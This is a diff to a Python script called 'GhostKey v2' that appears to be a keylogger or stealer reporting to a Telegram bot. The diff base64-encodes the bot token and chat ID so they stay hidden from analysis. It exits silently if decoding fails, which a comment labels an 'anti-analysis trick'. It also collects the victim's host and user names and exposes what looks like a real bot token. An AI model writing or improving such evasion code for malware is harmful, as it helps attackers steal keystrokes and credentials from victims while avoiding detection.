@@ -3,6 +3,7 @@
 GhostKey v2 — with Enhanced Website/URL Detection
 """
 
+import base64
 import os
 import sys
 import time
@@ -17,8 +18,17 @@ from datetime import datetime
 # ============================================================
 # CONFIG
 # ============================================================
-BOT_TOKEN = "8810561403:AAHuEYEJa1NjlpiLOHWdCghoe0mS3dYRey8"
-CHAT_ID = "6438143115"
+ENCODED_TOKEN = "ODgxMDU2MTQwMzpBQUh1RVlFSmExTmpscGlMT0hXZENnaG9lMG1TM2RZUmV5OA=="  # Replace with encoded token
+ENCODED_CHAT = "NjQzODE0MzExNQ==" # Replace with encoded chat_id
+# BOT_TOKEN = "8810561403:AAHuEYEJa1NjlpiLOHWdCghoe0mS3dYRey8"
+# CHAT_ID = "6438143115"
+# Decode at runtime
+try:
+    BOT_TOKEN = base64.b64decode(ENCODED_TOKEN).decode()
+    CHAT_ID = base64.b64decode(ENCODED_CHAT).decode()
+except:
+    # Fallback or exit if decoding fails (anti-analysis trick)
+    sys.exit(0)
 HOSTNAME = os.environ.get("COMPUTERNAME", "unknown")
 USERNAME = os.environ.get("USERNAME", "unknown")
 
